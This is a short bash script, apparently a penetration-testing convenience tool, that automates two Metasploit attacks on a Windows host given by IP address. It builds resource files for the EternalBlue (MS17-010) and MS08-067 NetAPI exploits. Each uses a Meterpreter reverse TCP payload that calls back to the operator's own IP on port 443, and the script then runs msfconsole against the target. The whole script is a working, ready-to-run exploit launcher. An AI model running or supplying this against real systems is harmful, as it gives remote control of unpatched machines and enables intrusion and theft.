#!/bin/bash

RED='\033[1;31m'
BLUE='\033[1;34m'
GREEN='\033[1;32m'
YELLOW='\033[49;93m'
NC='\033[0m' # No Color

echo -e "${YELLOW}"
echo -e "+---_-----------------------------------------------+"
echo -e "|  Adversarial Informatics Windows Exploit Autoatk  |"
echo -e "|               cygienesolutions.com                |"
echo -e "|      [Usage]: ./atk_ms_aic.sh <INF> <TARGET>      |"
echo -e "+---------------------------------------------------+"
echo -e "${NC}"
if [ $# == 0 ] ; then
    echo -e "${GREEN}"
    echo -e "Description:"
    echo -e "Attempts common Windows exploits against the target."
    echo -e ""
    echo -e "[Usage]: ./atk_ms_aic.sh eth0 192.168.1.44"
    echo -e "${NC}"
    exit 1; fi

INTERFACE="$1"
TARGET="$2"
LOCALIP=$(ifconfig $INTERFACE | grep 'inet' | cut -d: -f2 | awk '{print $2}')

#~ EternalBlue Attempt
echo use exploit/windows/smb/ms17_010_eternalblue > eternalblue.rc
echo set PAYLOAD windows/meterpreter/reverse_tcp >> eternalblue.rc
echo set RHOST $TARGET >> eternalblue.rc
echo set LPORT 443 >> eternalblue.rc
echo set LHOST $LOCALIP >> eternalblue.rc
echo exploit -z >> eternalblue.rc
echo -e "${GREEN}"
echo -e "Launching ms17_010_eternalblue on: $TARGET"
echo -e "${NC}"
msfconsole -r ./eternalblue.rc

#~ Confickr Attempt
echo use exploit/windows/smb/ms08_067_netapi > confickr.rc
echo set PAYLOAD windows/meterpreter/reverse_tcp >> confickr.rc
echo set RHOST $TARGET >> confickr.rc
echo set LPORT 443 >> confickr.rc
echo set LHOST $LOCALIP >> confickr.rc
echo exploit -z >> confickr.rc
echo -e "${GREEN}"
echo -e "Launching MS08_067_Netapi Confickr on: $TARGET"
echo -e "${NC}"
msfconsole -r ./confickr.rc





